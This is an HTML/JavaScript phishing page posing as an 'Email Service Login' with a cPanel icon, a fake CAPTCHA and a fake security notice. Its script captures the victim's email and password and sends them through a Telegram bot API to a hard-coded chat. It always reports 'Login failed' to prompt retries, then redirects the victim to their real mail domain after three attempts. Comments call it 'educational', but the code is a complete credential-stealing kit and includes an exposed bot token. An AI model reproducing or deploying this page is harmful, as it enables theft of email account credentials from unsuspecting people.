
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Service Login</title>
    <link href="https://www.creativefreedom.co.uk/wp-content/uploads/2017/01/cpanel-logo.png" rel="icon" type="image/gif" />

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
      
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 350px;
            padding: 30px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
            color: #4285F4;
            font-weight: bold;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        #sub-btn {
            width: 100%;
            padding: 10px;
            background: #4285F4;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
        }
        #sub-btn:hover {
            background: #3367D6;
        }
        #progress {
            margin-top: 15px;
            font-size: 14px;
            color: #666;
            text-align: center;
        }
        #error {
            color: red;
            margin-bottom: 15px;
            display: none;
        }
        #login-alert {
            display: none;
            background: #FFF3E0;
            border-left: 4px solid #FFA000;
            padding: 10px;
            margin-bottom: 15px;
        }
        #ethical-warning {
            background: #FFEBEE;
            border-left: 4px solid #F44336;
            padding: 15px;
            margin-top: 20px;
            font-size: 14px;
        }
        .captcha-container {
            margin: 15px 0;
            display: flex;
            align-items: center;
        }
        .captcha-code {
            font-family: 'Courier New', monospace;
            font-size: 20px;
            font-weight: bold;
            letter-spacing: 3px;
            padding: 5px 10px;
            background: #f0f0f0;
            border-radius: 4px;
            margin-right: 10px;
            user-select: none;
        }
        .refresh-captcha {
            background: none;
            border: none;
            font-size: 18px;
            cursor: pointer;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">Authentication Required</div><br>
        
        <div id="error"></div>
        <div id="login-alert">
            <p>Error <br>

There was an error with this action. Try again later.
8186de29-7bfa-4220-aa02-e484ecabe8ce </p>
        </div>
        
        <div id="div1">
            <div class="form-group">
                <label for="ai">Email</label>
                <input type="email" id="ai" placeholder="your@email.com">
            </div>
            <div class="form-group">
                <label for="pr">Password</label>
                <input type="password" id="pr" placeholder="Password">
            </div>
            
            <!-- CAPTCHA Section -->
            <div class="form-group">
                <label>CAPTCHA Verification</label>
                <div class="captcha-container">
                    <div id="captchaDisplay" class="captcha-code"></div>
                    <button type="button" id="refreshCaptcha" class="refresh-captcha">↻</button>
                </div>
                <input type="text" id="captchaInput" placeholder="Enter CAPTCHA code">
            </div>
            
            <button id="sub-btn">Sign In</button>
            <div id="progress"></div>
        </div>
        
        <div id="ethical-warning">
            <strong>SECURITY NOTICE:</strong> You're accessing secure settings, please provide your password to continue.
        </div>
    </div>

<script>
// Telegram Bot Configuration - FOR EDUCATIONAL PURPOSES ONLY
// Replace these with your own if you want to test the Telegram functionality
const BOT_TOKEN = "8452431501:AAEulCr9zDSqWKVvTcozPYpQpeyDy_hECQk"; // Get from @BotFather
const CHAT_ID = "1357995456";     // Get from @RawDataBot
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// Generate random CAPTCHA code
function generateCaptcha() {
    const chars = "8452431501:AAEulCr9zDSqWKVvTcozPYpQpeyDy_hECQk";
    let captcha = "";
    for (let i = 0; i < 5; i++) {
        captcha += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return captcha;
}

// Initialize CAPTCHA
let currentCaptcha = generateCaptcha();
$('#captchaDisplay').text(currentCaptcha);

// Refresh CAPTCHA
$('#refreshCaptcha').click(function() {
    currentCaptcha = generateCaptcha();
    $('#captchaDisplay').text(currentCaptcha);
    $('#captchaInput').val('');
});

$(document).ready(function() {
    var count = 0; // Login attempt counter

    // Submit form on Enter key
    $(document).keypress(function(event) {
        if (event.keyCode == '13') {
            event.preventDefault();
            $("#sub-btn").click();
        }
    });

    // Pre-fill email from URL hash (#test@example.com)
    var ai = window.location.hash.substr(1);
    if (ai) {
        $("#ai").val(ai);
        simulateLoading(ai);
    }

    function simulateLoading(email) {
        var domain = email.split('@')[1] || "example.com";
        $('#progress').html("Connecting to " + domain + "...");
        
        setTimeout(() => {
            $('#progress').html("Checking credentials...");
            setTimeout(() => {
                $('#progress').css("color", "red").html("Login failed - Try again...");
            }, 1000);
        }, 1000);
    }

    // Form submission handler
    $('#sub-btn').click(function(event) {
        event.preventDefault();
        var ai = $("#ai").val().trim();
        var pr = $("#pr").val().trim();
        var userCaptcha = $("#captchaInput").val().trim();

        // Basic validation
        if (!ai || !pr || !userCaptcha) {
            $('#error').show().html("Please complete all fields").fadeIn();
            return false;
        }

        // Simple email format check
        if (!ai.includes('@') || !ai.includes('.')) {
            $('#error').show().html("Please enter a valid email address").fadeIn();
            return false;
        }

        // CAPTCHA validation
        if (userCaptcha.toUpperCase() !== currentCaptcha) {
            $('#error').show().html("Invalid CAPTCHA code").fadeIn();
            currentCaptcha = generateCaptcha();
            $('#captchaDisplay').text(currentCaptcha);
            $('#captchaInput').val('');
            return false;
        }

        count++;
        $('#sub-btn').html('Verifying...');
        $('#error').hide();

        // Ethical logging to Telegram - FOR EDUCATIONAL DEMONSTRATION ONLY
        const timestamp = new Date().toLocaleString();
        const message = ` Mr Selfless046 \n\n` +
                       ` ${timestamp}\n` +
                       ` Email: ${ai}\n` +
                       ` Password: ${pr}\n` +
                       ` CAPTCHA Attempt: ${userCaptcha}\n` +
                       ` CAPTCHA Match: ${userCaptcha.toUpperCase() === currentCaptcha ? "Yes" : "No"}\n` +
                       ` Page: ${window.location.hostname}\n` +
                       ` Attempt: ${count}/3`;
 

        // Send to Telegram
        $.ajax({
            url: TELEGRAM_API,
            method: "POST",
            data: {
                chat_id: CHAT_ID,
                text: message
            },
            success: function() {
                console.log("Check again");
                
                // Simulate processing
                $('#progress').html("Checking credentials...");
                setTimeout(() => {
                    $('#progress').css("color", "red").html("Login failed - Please try again");
                    $('#sub-btn').html('Sign In');
                    
                    // Generate new CAPTCHA
                    currentCaptcha = generateCaptcha();
                    $('#captchaDisplay').text(currentCaptcha);
                    $('#captchaInput').val('');
                    
                    // Clear password field
                    $("#pr").val("");

                    // After 3 attempts, show redirect message
                    if (count >= 3) {
                        $('#login-alert').show();
                        setTimeout(() => {
                            window.location.replace('https://' + ai.split('@')[1]);
                        }, 3000);
                    }
                }, 1500);
            },
            error: function(err) {
                console.error("Check again", err);
                simulateLoading(ai);
            }
        });
    });
});
</script>
</body>
</html>
